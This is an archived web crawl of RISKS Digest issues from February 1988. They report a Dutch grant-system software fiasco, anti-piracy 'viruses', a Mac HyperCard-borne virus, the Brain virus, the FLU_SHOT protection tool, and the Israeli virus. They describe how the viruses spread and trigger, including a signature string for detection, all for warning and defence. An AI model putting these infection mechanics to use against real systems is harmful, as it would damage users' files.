* Ms Ymke Dykstra (86 years old) got a grant of f 2250 for study although she
  didn't study at all (Computable 19/1/88).

Of course these students were not the only ones suffering from that grants &amp;
loans distribution system.  One estimated that about 100000 out of the 550000
students had trouble because of this unreliable software system (Leids Dagblad
23/10/87).  Apart from actual blunders, a major problem was that the computer
system and organisation couldn't handle the load.  So apparently the respons to
any mutation was to freeze all payments until all previous arrears was made up.
In this way many students didn't receive their monthly payment, but their
complaints only increased the load.  It was estimated that for example in
august 130000 letters were left unreplied (NRC 13/10/87).  Students who tried
to phone couldn't get through either; in august 1.1 million phone calls were
tried but only 60000 got through (NRC 18/9/1987), and those students who did
get through were told that nothing could/would be done because the
administration department "was probably working on it" and complaints should be
done in writing (which would only worsen the chaos of course!).  Many desperate
students who didn't got any improvement in their financial situation personally
travelled to Groningen daily (about 2 to 3 hours one way) to plead their case,
but all in vain.

Nevertheless, the minister denied the occurence of any problems repeatedly
until the end of 1987, when an investigation was started.  It appeared that all
the people responsible for the software had warned the minister repeatedly that
the software could not be ready before 1987.  The minister however, insisted
upon a start one and a half years earlier, in the beginning of 1986 (NRC
15/12/87).  This resulted in a total chaos of which many students suffered.  In
the meantime the costs of this project, originally estimated at f 20 million,
increased to f 73 million (computerworld 1/12/87).

F.H.D.van Batenburg

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: viruses (<A HREF="/Risks/6.23.html">RISKS-6.23</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
10 Feb 88 10:17:11 PST (Wednesday)
</i><PRE>
From: "chaz_heritage.WGC1RX"@Xerox.COM

It is now clear that certain software houses are using virus as a deterrent to
software piracy. There is at least one commercial system (Softguard 3.00)
designed to destroy the files of a user who attempts to copy software protected
by it.

This activity is, in my personal view, unjustifiable; there is quite enough
trouble with malicious amateurs as it is. I do not believe that any such system
can prevent disc copying by purely  hardware devices. There is no reason to
suppose that a dedicated amateur could not break down the protection of the
anti-copy system itself, attach it to hitherto unprotected software, and post
the whole thing to CompuServe or whatever - thus creating another epidemic.

I have adopted certain policies which I would recommend:

1  If you can manage with

2  Buy only unprotected, 'professional' software products from reputable houses
who advertise the fact that their products lack protection devices. Pay the
extra cost cheerfully and expect a professional level of support from the
software house involved.

3  If you run a commercial game program, power down the entire system for at
least five seconds afterwards before doing anything serious. Virus, like RAM
discs, may be reset-survivable.

4  If you detect a software house using virus in its products, then do (a) an
immediate boycott; (b) as much adverse publicity as you can manage.

Software houses who trust their customers not to steal from them should be
respected and supported; there are many in UK and with luck the number will
increase. Software houses who use virus against their customers are
conspirators to commit criminal damage and should be treated as such.

Chaz Heritage

Disclaimer: these are my personal views and not  necessarily those of any other
person or corporate entity.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
CompuServe virus - more details et cetera
</A>
</H3>
<address>
David HM Spector 
&lt;<A HREF="mailto:spector@vx2.GBA.NYU.EDU">
spector@vx2.GBA.NYU.EDU
</A>&gt;
</address>
<i>
Wed, 10 Feb 88 15:45:41 EST
</i><PRE>

An update on the Macintosh virus on CompuServe (and other systems):

The virus mentioned in Risks 6.22 seems also to be in at least one other
HyperCard stack that I found on a BBS in San Jose and and on GEnie, General
Electric's Information Service.  The stack is called "The Apple Product
Stack" (or something similar) and claims to be a preview of some upcoming
Apple products.  (I am in the process of contacting the SysOps of the BBS to
inform them of its presence.)  What this stack does is show a badly scanned
image of something indiscernable and then (in the background) installs a
virus into your system file.

Later, I was horrified to find during a check of my MacintoshII at home, that 
the very virus I had reported about being on CompuServe was alive and kicking
in  **MY** Macintosh.  [I feel like I have been violated!]

Upon setting a number of disassemblers to work on the virus itself, I was able 
to determine that its a date-triggered, self-propagating retro-virus.
(Please pardon the abuse of the terminology...)   Its characteristics and
workings are as follows:

It is an "INIT" resource (for the uninitiated an INIT is a code segment that 
gets run by the Macintosh OS at system startup time).  INITs are usually
used to do things like start mail servers, screen blankers, patch OS bugs, etc.

The virus's method of transmission is (suprise, suprise) via floppy disks
*or* by an infected system "mounting" any volume that contains a bootable 
system file.

It sets itself up as a running part of the operating system by modifying 
system traps.  The code is set to do something {I have not yet figured\
out what, but it starts by showing a picture of some sort} on March 2nd, 1988.
There seems to be a few data areas in the middle of the code which may get
jumped-to and then do something else, but I haven't had time to explore it
to that end yet.

If you try to remove it from a running system, and it tries to propagate 
itself, your workstation will crash since the virus code is not present to 
service the system trap request. And if you tansfer control to another 
system file/disk  without write-locking it (in hardware!) first, you've just 
infected the other system!.  

The best solution is the one suggested by Neil Shapiro, the Cheif SysOp of 
CompuServe's MAUG; replace the system files ASAP, preferably by booting your 
Macintosh from a write-locked floppy and copying a fresh system onto your 
hard disk and any bootable floppies you have around.

The really "clever" part of this, if you will, was the use of a HyperCard stack
at the initial transmission medium.  HyperCard is a realy nifty program that
is extensible with XCMDs and XFCNs (external commands and functions) usually
written in C, Pascal or Assembly to provide functionality not present in 
Apple's Standard HyperCard distribution.  The stack called this "user supplied"
function, and &gt;&gt;ZAP&lt;&lt; a perfectly useful feature turned into a weapon.

I wonder how many viruses exist in copies of Lotus-1-2-3 on IBM-PCs?  I 
understand external functions may be added with either C or Assembly.


On a lighter note:
I am looking into writing some detection programs (for Macs) to look for 
common things that the viruses in my "collection" do in a target program, 
and warn that a program under examination _MAY_ be less than safe.  Not a 
certification by any means but perhaps a way to check for simpler viruses...
(And of course, it would/should have built-in ways to make sure it was not 
itself compromised... if that's possible.  Perhaps by some clever crc 
scheme -- I don't know right now, as its just an interesting midnight project 
idea.)

David HM Spector				New York University
Senior Systems Programmer			Graduate School of Business
Arpa: SPECTOR@GBA.NYU.EDU			Academic Computing Center
UUCP:...!{allegra,rocky,harvard}!cmcl2!spector	90 Trinity Place, Rm C-4
MCIMail: DSpector				New York, New York 10006
AppleLink: D1161     Compu$erve: 71260,1410  	GEnie: XJM21945

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.23.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.25.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-61</DOCNO>
<DOCOLDNO>IA012-000130-B024-200</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.25.html 128.240.150.127 19970217015611 text/html 26579
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:54:37 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 25</TITLE>
<LINK REL="Prev" HREF="/Risks/6.24.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.26.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.24.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.26.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 25</H1>
<H2> Thursday, 11 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Something fishy is going on with credit cards 
</A>
<DD>
<A HREF="#subj1.1">
William Daul
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  "Colloidal goo" considered harmful to ATM's 
</A>
<DD>
<A HREF="#subj2.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Lottery Random Numbers Too Random...  (Henry 
</A>
<DD>
<A HREF="#subj3.1">
H.W.) Troup
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  New Scientist article on viruses 
</A>
<DD>
<A HREF="#subj4.1">
Bernie Cosell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Virus code and Infected Definitions 
</A>
<DD>
<A HREF="#subj5.1">
Vin McLellan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Yet Another Virus - The "Brain" Virus 
</A>
<DD>
<A HREF="#subj6.1">
Bruce N. Baker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Two virus messages from Info-IBMPC 
</A>
<DD>
<A HREF="#subj7.1">
Jack Goldberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Virus (Trojan) protection program now available from SIMTEL20
</A>
<DD>
<A HREF="#subj8.1">
Keith Petersen
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Another PC Virus 
</A>
<DD>
<A HREF="#subj9.1">
Y. Radai
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Something fishy is going on with credit cards
</A>
</H3>
<address>
William Daul / McAir / McDonnell-Douglas Corp  
&lt;<A HREF="mailto:WBD.MDC@OFFICE-8.ARPA">
WBD.MDC@OFFICE-8.ARPA
</A>&gt;
</address>
<i>
11 Feb 88 00:27 PST
</i><PRE>

From: PENINSULA TIMES TRIBUNE (Palo Alto, Feb. 10, 1988)

SAN FRANCISCO (AP) -- The same eelskin used to make popular handbags may be
erasing credit cards and confounding bankers by scrambling magnetic codes on
automatic teller cards, experts said Tuesday.  "We've had dozens of calls
from banks and individuals complaining that (automated teller machine) cards
and credit cards are sick." said John McCosker, director of San Francisco's
Steinhart Aquarium and a leading fish scientist.  McCrosker believes the
metallic residue left over from the tanning process performed in Korea,
where most of the wallets and purses are made, may be causing the problem.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
"Colloidal goo" considered harmful to ATM's
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 11 Feb 88 10:33:35 PST

... Or, [icthyologist John McClosker] said, the problem might be from the
"colloiodal goo that comes out of the slime glands of these awful things."
The "eelskin" wallet problem has become so serious that (several banks) are
warning card holders.
                               ['COLLOIDAL GOO' SPELLS HEADACHE FOR BANKERS,
                               Seattle Post-Intelligencer, Feb 11, 1988, p. C1]

[Another theory, from an article by Kevin Leary in the SF Chron, 10 Feb 88:

   Katie Jarman, Bank of America's senior project analyst for the bank's ATM
   system, is not so sure.  "We have found that when we demagnetized
   Versatel cards, the wallets or purses have large magnetic clasps that
   could do the damage."   ]

       [Perhaps someone has a magnetic personeelity in the Korean tanning 
       salons that process the slime-eel skin.  Check with Colloids of London.
       {OK, what does Sylvester Stallone eat for breakfast?  Sly-meal.}  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Lottery Random Numbers Too Random...
</A>
</H3>
<address>
Henry (H.W.) Troup 
&lt;<A HREF="mailto:HWT%BNR.BITNET@CUNYVM.CUNY.EDU">
HWT%BNR.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
11 Feb 88 08:10:00 EST
</i><PRE>

Tuesday, February 9th's Ottawa Citizen ran a story, with a photo of the ticket,
of a lottery ticket with an impossible number.  The lottery is called 6/49.
The player chooses six numbers between 1 and 49.  A recent function added is
the "QuickPick", where the lottery terminal generates a set of numbers for you.

The photo clearly showed the number 67 in one generated line! Fortunately
for players, the final prize numbers are generated with a mechanical "bingo"
machine (the one with numbered ping-pong balls).  But one wonders what else
might be lurking in that software...

Has this been reported in other jursidictions using point-of-sale lottery
terminals?  Anyone out there know anything about them?

          [If you see any suspicious types hanging around a lottery site,
          be sure to do some strong type checking -- wOTTAWAy to go!  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 New Scientist article on viruses
</A>
</H3>
<address>
    Bernie Cosell 
&lt;<A HREF="mailto:cosell@WILMA.BBN.COM">
cosell@WILMA.BBN.COM
</A>&gt;
</address>
<i>
Thu, 11 Feb 88 8:45:34 EST
</i><PRE>

The 28 jan issue of _New_Scientist_ has a short article on viruses:
"Phantoms of the operating system, Andrew Emmerson with news of an
insidious threat to personal computers".  Nothing particular new
or interesting here for RISKS readers, but it is a pretty accessible
article for the otherwise-uninformed.

Bernie Cosell, BBN Labs, Cambridge, MA 02238

                                           [At least the title is catchy!  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Virus code and Infected Definitions
</A>
</H3>
<address>
"Vin McLellan" 
&lt;<A HREF="mailto:SIDNEY.G.VIN%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU">
SIDNEY.G.VIN%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Thu 11 Feb 88 01:46:15-EST
</i><PRE>

    Discussions about viruses might benefit from some rigorous definitions.
The copy protection devices allegedly used in Softguard 3.0, and earlier
installed in Microsoft's master disk of ACCESS, apparently without the
company's knowledge or permission, and even earlier (back in '84), announced
as a forthcoming product by Vault Corp., have all at various times been
described as viruses, even by officials at the companies involved.  Yet all
seem to actually be fairly classic Trojan horse code, set to execute and
damage either the program being illicitly copied, or that program and other
available disk files, when and if the program is "pirated."

    A virus, according to Fred Cohen, a widely acknowledged expert on the
threat, is "a program that can 'infect' other programs by modifying them to
include a possibly evolved copy of itself.  With the infection property, every
virus can spread thoughout a computer system or network using the
authorizations of every user using it to infect their programs. Every program
that gets infected may also act as a virus and thus the infection spreads."

    Even in a PC environment, a virus is defined by contagion, by its ability
to bury copies of itself in other programs and thus spread to multiple disks,
multiple users. We may have many occasions to discuss the virus threat in the
future, and no one will be served if we allow the term to become as vague as
the word "worm" is today.  Those who make a living discussing security issues
will be haunted for years by the erroneous labelling of that automated Trojan
chain letter in Bitnet and IBM's Vnet as the "Christmas virus." (Some IBM
engineers ended up labelling that a "bacteria," just to help worried customers
get their terms straight.)

   The Germans -- who seem to have gotten into the development of viruses
earlier and with even greater enthusiasm than we see today in amateur America
-- seem to think that writing viruses that evade CRC or checksum alarms is
child's play, literally.  If the virus can't forge a checksum, they fiddle
with program's name or set the virus to displace the protected program, so the
virus code gets executed first and separately, then the protected program is
either renamed or run consecutively. Folks there and elsewhere who have been
exploring the potential of a constantly evolving virus also seem a little
awestruck at what they've been coming up with.

Vin McLellan, The Privacy Guild, Boston, Ma.               (617) 426-2487

   [Thanks.  I have on various occasions referred to Trojan viruses,
   but clearly the attacks are Trojan horses at the outset.  What is
   put inside the Trojan horse varies from attack to attack.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Yet Another Virus - The "Brain" Virus
</A>
</H3>
<address>
Bruce N. Baker 
&lt;<A HREF="mailto:BNBaker@KL.SRI.COM">
BNBaker@KL.SRI.COM
</A>&gt;
</address>
<i>
Thu 11 Feb 88 16:50:47-PST
</i><PRE>

I expect some RISKS readers have heard of this one but I have not seen
anything yet in RISKS about it.  This is taken form the February 3, 1988
edition of The Chronicle of Higher Education and is quoted here in part
without permission.

George Washington University, the University of Delaware, and the University
of Pittsburgh all have taken steps to eradicate a virus - known as the "brain"
virus because it can be identified by "(c) BRAIN" on the directory screen.
The virus was created by Basit Farooq Alvi, 19, who claims to be a college 
student in Lahore, Pakistan.  In 1986 Mr. Alvi and his brother Amjad, 23,
wrote the computer code for the virus and placed it on a disk that they gave 
to another student.  He did it "for fun," he said and has no idea how it might 
have reached the United States.  A message with Mr. Alvi's name, address, and
telephone number appears in the computer code that carries the virus.

The antidote is to substitute a clean operating system for the one that was 
contaminated with the virus.

End of excerpts from the article.

Many RISKS readers and others are extremely concerned about the proliferation
of viruses.  To summarize some of the virus detection and eradication programs
that have appeared in RISKS to date, public domain programs include:
     CHK4BOMB - see RISKS 5.79
     BOMBSQAD - see RISKS 5.79
     FLU_SHOT - [See THIS ISSUE OF RISKS]
Programs to buy:
     DATA PHYSICIAN - references to it in several RISKS issues but nowhere  
       does this information about the vendor appear:
          Digital Dispatch Inc.         Attention:  Mr. Eric Hansen
          1580 Rice Creek Rd.   
          Minneapolis, Minnesota 55432  Telephone (617) 571-7400        
          U.S.A.                        For MS/DOS systems, sells for $199
     TRUSS was mentioned in RISKS 6.12 for UNIX version 8 but no indication was
       given about its availability to the public - free or for a cost.  I have
       asked Dennis  L. Mumaugh, "moss!cuuxb!dlm"@RUTGERS.EDU to let us know.

Bruce N. Baker, SRI International

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Two virus messages from Info-IBMPC
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 11 Feb 88 09:19:04 -0800
From: Jack Goldberg &lt;goldberg@csl.sri.com&gt;

EXCERPTS FROM 
Info-IBMPC Digest           Mon, 8 Feb 88       Volume 7 : Issue   8
This Week's Editor: Gregory Hicks -- Chinhae Korea &lt;hicks@walker-emh.arpa&gt;
Today's Topics:
       Another PC Virus (Y. Radai)
       Virus (Trojan) protection program now available (Keith Peterson)   
       ...

    SIMTEL20.ARPA can now be accessed access from BITNET is via
       LISTSERV@RPICICGE.BITNET using LISTSERV Commands
      INFO-IBMPC BBS Phone Numbers: (213) 827-2635 and (213) 827-2515

   [We include the article by Keith Peterson first, and then another
   (longer) article on the Israeli virus by Y. Radai -- although we 
   have had earlier articles on it in RISKS-6.6 and 6.12.  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Virus (Trojan) protection program now available from SIMTEL20
</A>
</H3>
<address>
Keith Petersen 
&lt;<A HREF="mailto:W8SDZ@SIMTEL20.ARPA">
W8SDZ@SIMTEL20.ARPA
</A>&gt;
</address>
<i>
Wed, 27 Jan 1988  00:56 MST
</i><PRE>

FROM Info-IBMPC Digest           Mon, 8 Feb 88       Volume 7 : Issue   8
    SIMTEL20.ARPA can now be accessed access from BITNET is via
       LISTSERV@RPICICGE.BITNET using LISTSERV Commands
      INFO-IBMPC BBS Phone Numbers: (213) 827-2635 and (213) 827-2515

Filename            Type  Bytes     CRC

Directory PD1:&lt;MSDOS.DSKUTL&gt;
FLUSHOT2.ARC.1           BINARY      5539  AFA8H

Here are some comments from the author, Ross Greenberg:

There exists a low-level form of dirt who gets joy out of destroying
your work.  They release a program, typically called a 'Trojan Horse',
which is designed to erase or otherwise damage your disks.

The programs are released into the public domain and typically are
downloaded or distributed exactly as you may have received this file.
Once run, they would print some sort of self-congratulatory message
and proceed to erase your data.  Obviously, these type of programs are
Not A Good Thing, and should be avoided.  However, usually you'll only
know you've been bit by a trojan after the fact.

Recently, a new breed has been developed.  Called a 'virus', it
infects all disks that it sees with a copy of itself, and then each of
these copies are capable of infecting all disks that *they* see.

Eventually, at some predetermined instance (a date, a time, a certain
number of copy operations), the virus attacks and destroys whatever
disks it can.  By this time, though, the virus has spread, and a
friends' machine may also be infected, infecting the disks of their
friends and so forth.

It was to counter just such a program that the enclosed program,
called FLU_SHOT, was developed.  The current virus making the rounds
infects the command processing program called "COMMAND.COM".  Every
bootable DOS disk must have a copy of this file.  FLU_SHOT examines
each write and will not allow a write operation to the COMMAND.COM
file to take place without your permission.  Normally, there should
never be a write operation to this file, so it should be effective in
that regard.

To run FLU_SHOT, place a copy of it in your root directory on the disk
you boot your system from.  Additionally, a line to invoke FLU_SHOT
should be placed in your AUTOEXEC.BAT file.

If you find the virus attacking your disk, please try to preserve a
copy of it and to forward it to me at my BBS at (212)-889-6438.  Once
I have a copy of the virus, I should be able to develop another
program which would serve as a vaccine.

Please be aware that there is a possibility that, if FLU_SHOT
determines a write operation taking place to your COMMAND.COM, it
*may* be a legitimate one ---- check the currently running program.
FLU_SHOT may indicate that a TSR program you're running seems to be
causing a problem.  If this happens to you, and you're sure the TSR
you're running is a valid one, then merely place the FLU_SHOT
invokation line in your AUTOEXEC *after* the TSR invokation line.

Additionally, FLU_SHOT can not determine whether your current
COMMAND.COM is infected, only if a COMMAND.COM is about to be
infected.

The odds of you being hit with this virus are slim, but running
FLU_SHOT should keep this particular incarnation of the virus from
infecting your disks.

Ross M. Greenberg
(212)-889-6438 24hr BBS, 2400/1200,N,8,1

Note from Keith:  This program is legitimate.  Ross is a personal
friend whose programming skills I highly respect.

--Keith Petersen
Arpa: W8SDZ@SIMTEL20.ARPA
Uucp: {decwrl,harvard,lll-crg,ucbvax,uunet,uw-beaver}!simtel20.arpa!w8sdz
GEnie: W8SDZ

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Another PC Virus
</A>
</H3>
<address>
Y. Radai 
&lt;<A HREF="mailto:RADAI1%HBUNOS.BITNET@CNUCE-VM.ARPA">
RADAI1%HBUNOS.BITNET@CNUCE-VM.ARPA
</A>&gt;
</address>
<i>
Wed,  27 Jan 88 13:22:27 +0200
</i><PRE>

FROM Info-IBMPC Digest           Mon, 8 Feb 88       Volume 7 : Issue   8
    SIMTEL20.ARPA can now be accessed access from BITNET is via
       LISTSERV@RPICICGE.BITNET using LISTSERV Commands
      INFO-IBMPC BBS Phone Numbers: (213) 827-2635 and (213) 827-2515

   Issue 74 of the Info-IBMPC digest contained a description of a "virus"
discovered at Lehigh University which destroys the contents of disks after
propagating itself to other disks four times.  Some of us here in Israel,
never far behind other countries in new achievements (good or bad), are
suffering from what appears to be a local strain of the virus.  Since it
may have spread to other countries (or, for all we know, may have been im-
ported from abroad), I thought it would be a good idea to spread the word
around.

   Our version, instead of inhabiting only COMMAND.COM, can infect any ex-
ecutable file.  It works in two stages:  When you execute an infected EXE
or COM file the first time after booting, the virus captures interrupt 21h
and inserts its own code.  After this has been done, whenever any EXE file
is executed, the virus code is written to the end of that file, increasing
its size by 1808 bytes.  COM files are also affected, but the 1808 bytes
are written to the beginning of the file, another 5 bytes (the string
"MsDos") are written to the end, and this extension occurs only once.

   The disease manifests itself in at least three ways: (1) Because of this
continual increase in the size of EXE files, such programs eventually be-
come too large to be loaded into memory or there is insufficient room on
the disk for further extension.  (2) After a certain interval of time
(apparently 30 minutes after infection of memory), delays are inserted so
that execution of programs slows down considerably.  (The speed seems to be
reduced by a factor of 5 on ordinary PCs, but by a smaller factor on faster
models.)  (3) After memory has been infected on a Friday the 13th (the next
such date being May 13, 1988), any COM or EXE file which is executed on
that date gets deleted.  Moreover, it may be that other files are also af-
fected on that date; I'm still checking this out.

(If this is correct, then use of Norton's UnErase or some similar utility
to restore files which are erased on that date will not be sufficient.)

   Note that this virus infects even read-only files, that it does not
change the date and time of the files which it infects, and that while the
virus cannot infect a write-protected diskette, you get no clue that an at-
tempt has been made by a "Write protect error" message since the pos-
sibility of writing is checked before an actual attempt to write is made.

   It is possible that the whole thing might not have been discovered in
time were it not for the fact that when the virus code is present, an EXE
file is increased in size *every* time it is executed.  This enlargement of
EXE files on each execution is apparently a bug; probably the intention was
that it should grow only once, as with COM files, and it is fortunate that
the continual growth of the EXE files enabled us to discover the virus much
sooner than otherwise.

   From the above it follows that you can fairly easily detect whether your
files have become infected.  Simply choose one of your EXE files
(preferably your most frequently executed one), note its length, and ex-
ecute it twice.  If it does not grow, it is not infected by this virus.
If it does, the present file is infected, and so, probably, are some of
your other files.  (Another way of detecting this virus is to look for the
string "sUMsDos" in bytes 4-10 of COM files or about 1800 bytes before the
end of EXE files; however, this method is less reliable since the string
can be altered without attenuating the virus.)

   If any of you have heard of this virus in your area, please let me know;
perhaps it is an import after all.  (Please specify dates; ours was noticed
on Dec. 24 but presumably first infected our disks much earlier.)

   Fortunately, both an "antidote" and a "vaccine" have been developed for
this virus.  The first program cures already infected files by removing the
virus code, while the second (a RAM-resident program) prevents future in-
fection of memory and displays a message when there is any attempt to in-
fect it.  One such pair of programs was written primarily by Yuval Rakavy,
a student in our Computer Science Dept.

   In their present form these two programs are specific to this particular
virus; they will not help with any other, and of course, the author of the
present virus may develop a mutant against which these two programs will be
ineffective.  On the other hand, it is to the credit of our people that
they were able to come up with the above two programs within a relatively
short time.

   My original intention was to put this software on some server so that it
could be available to all free of charge.  However, the powers that be have
decreed that it may not be distributed outside our university except under
special circumstances, for example that an epidemic of this virus actually
exists at the requesting site and that a formal request is sent to our head
of computer security by the management of the institution.

   Incidentally, long before the appearance of this virus, I had been using
a software equivalent of a write-protect tab, i.e. a program to prevent
writing onto a hard disk, especially when testing new software.  It is
called PROTECT, was written by Tom Kihlken, and appeared in the Jan. 13,
1987 issue of PC Magazine; a slightly amended version was submitted to the
Info-IBMPC library.  Though I originally had my doubts, it turned out that
it is effective against this virus, although it wouldn't be too hard to
develop a virus or Trojan horse for which this would not be true.  (By the
way, I notice in Issue 3 of the digest, which I received only this morning,
that the version of PROTECT.ASM in the Info-IBMPC library has been replaced
by another version submitted by R. Kleinrensing.  However, in one respect
the new version seems to be inferior: one should *not* write-protect all
drives above C: because that might prevent you from writing to a RAMdisk or
an auxiliary diskette drive.)

   Of course, this is only the beginning.  We can expect to see many new
viruses both here and abroad.  In fact, two others have already been dis-
covered here.  In both cases the target date is April 1.  One affects only
COM files, while the other affects only EXE files.  What they do on that
date is to display a "Ha ha" message and lock up, forcing you to cold boot.
Moreover (at least in the EXE version), there is also a lockup one hour
after infection of memory on any day on which you use the default date of
1-1-80.  (These viruses may actually be older than the above-described
virus, but simply weren't noticed earlier since they extend files only
once.)

   The author of the above-mentioned anti-viral software has now extended
his programs to combat these two viruses as well.  At present, he is con-
centrating his efforts on developing broad-spectrum programs, i.e. programs
capable of detecting a wide variety of viruses.

   Just now (this will give you an idea of the speed at which developments
are proceeding here) I received notice of the existence of an anti-viral
program written by someone else, which "checks executable files and reports
whether they include code which performs absolute writes to disk, disk for-
matting, writes to disk without updating the FAT, etc."  (I haven't yet
received the program itself.)

Y. Radai, Computation Center, Hebrew University of Jerusalem 
RADAI1@HBUNOS.BITNET

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.24.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.26.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-62</DOCNO>
<DOCOLDNO>IA012-000130-B024-218</DOCOLDNO>
